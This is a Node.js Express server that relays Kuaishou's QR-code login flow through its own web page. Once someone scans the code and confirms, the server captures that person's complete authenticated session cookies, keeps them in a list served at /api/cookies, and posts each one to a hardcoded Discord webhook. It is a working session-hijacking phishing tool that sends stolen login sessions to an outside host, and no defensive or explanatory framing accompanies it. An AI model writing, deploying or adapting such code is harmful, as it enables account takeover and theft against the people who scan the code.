const express = require("express");
const https = require("https");
const { v4: uuidv4 } = require("uuid");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(__dirname));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";

const cookies = [];
const scans = {};

function ksRequest(method, hostname, path, body, cookieStr) {
    return new Promise(function(resolve, reject) {
        var headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Referer": "https://www.kuaishou.com/"
        };
        if (body) headers["Content-Type"] = "application/json";
        if (cookieStr) headers["Cookie"] = cookieStr;

        var options = { hostname: hostname, path: path, method: method, headers: headers };
        var req = https.request(options, function(res) {
            var bodyStr = "";
            var respCookies = res.headers["set-cookie"] || [];
            res.on("data", function(chunk) { bodyStr += chunk; });
            res.on("end", function() {
                resolve({ status: res.statusCode, cookies: respCookies, body: bodyStr });
            });
        });
        req.on("error", function(e) { reject(e); });
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
}

function buildCookie(arr) {
    return arr.map(function(c) { return c.split(";")[0]; }).join("; ");
}

function initSession() {
    return ksRequest("GET", "www.kuaishou.com", "/", null, null).then(function(r1) {
        var c = r1.cookies;
        return ksRequest("GET", "id.kuaishou.com", "/", null, buildCookie(c)).then(function(r2) {
            c = c.concat(r2.cookies);
            return ksRequest("GET", "id.kuaishou.com", "/passport/qrCode", null, buildCookie(c)).then(function(r3) {
                c = c.concat(r3.cookies);
                return { cookies: c, cookieStr: buildCookie(c) };
            });
        });
    });
}

// ====== 页面 ======
app.get("/", function(req, res) {
    res.sendFile(path.join(__dirname, "scan.html"));
});

app.get("/cookies", function(req, res) {
    res.sendFile(path.join(__dirname, "cookies.html"));
});

// ====== 生成二维码 ======
app.get("/api/qr", function(req, res) {
    var scanId = uuidv4();

    initSession().then(function(session) {
        ksRequest("POST", "id.kuaishou.com", "/rest/c/infra/ks/qr/start", { source: "web" }, session.cookieStr).then(function(result) {
            try {
                var data = JSON.parse(result.body);
                if (data.result !== 1) {
                    return res.json({ error: "获取失败: " + (data.error_msg || "未知") });
                }
                var qrCode = (data.data && (data.data.qrCode || data.data.imageData)) || "";
                var qrToken = (data.data && (data.data.qrToken || data.data.token)) || "";

                if (!qrCode) return res.json({ error: "未找到二维码" });

                scans[scanId] = {
                    status: "wait",
                    qrToken: qrToken,
                    qrCode: qrCode,
                    cookies: session.cookies.concat(result.cookies),
                    cookieStr: buildCookie(session.cookies.concat(result.cookies)),
                    createdAt: Date.now()
                };
                res.json({ scanId: scanId, qrCode: qrCode });
            } catch(e) {
                res.json({ error: "解析失败" });
            }
        }).catch(function() {
            res.status(500).json({ error: "请求失败" });
        });
    }).catch(function() {
        res.status(500).json({ error: "初始化失败" });
    });
});

// ====== 检查状态 ======
app.get("/api/check", function(req, res) {
    var id = req.query.id;
    var scan = scans[id];
    if (!scan) return res.json({ status: "expired" });
    if (scan.status === "done") return res.json({ status: "done", cookie: scan.cookie });

    ksRequest("POST", "id.kuaishou.com", "/rest/c/infra/ks/qr/checkResult", { qrToken: scan.qrToken }, scan.cookieStr).then(function(result) {
        try {
            var data = JSON.parse(result.body);
            var scanStatus = (data.data && data.data.status) || data.status || 0;

            if (scanStatus === 2 || scanStatus === 3) {
                var allCookies = scan.cookies.concat(result.cookies);
                ksRequest("GET", "www.kuaishou.com", "/", null, buildCookie(allCookies)).then(function(homeRes) {
                    allCookies = allCookies.concat(homeRes.cookies);
                    scan.status = "done";
                    scan.cookie = buildCookie(allCookies);
                    cookies.push({ cookie: scan.cookie, time: new Date().toISOString() });
                    sendToDiscord(scan.cookie);
                    res.json({ status: "done", cookie: scan.cookie });
                }).catch(function() {
                    scan.status = "done";
                    scan.cookie = buildCookie(allCookies);
                    cookies.push({ cookie: scan.cookie, time: new Date().toISOString() });
                    sendToDiscord(scan.cookie);
                    res.json({ status: "done", cookie: scan.cookie });
                });
            } else if (scanStatus === 1) {
                res.json({ status: "scanned" });
            } else {
                res.json({ status: "wait" });
            }
        } catch(e) {
            res.json({ status: "wait" });
        }
    }).catch(function() {
        res.json({ status: "wait" });
    });
});

// ====== 列表 ======
app.get("/api/cookies", function(req, res) {
    res.json(cookies.slice(-50).reverse());
});

// ====== Discord ======
function sendToDiscord(cookie) {
    var data = JSON.stringify({ content: "**新Cookie**\n```\n" + cookie + "\n```" });
    var url = new URL(WEBHOOK_URL);
    var req = https.request({
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) }
    });
    req.write(data);
    req.end();
}

var PORT = process.env.PORT || 3000;
app.listen(PORT, function() { console.log("端口 " + PORT); });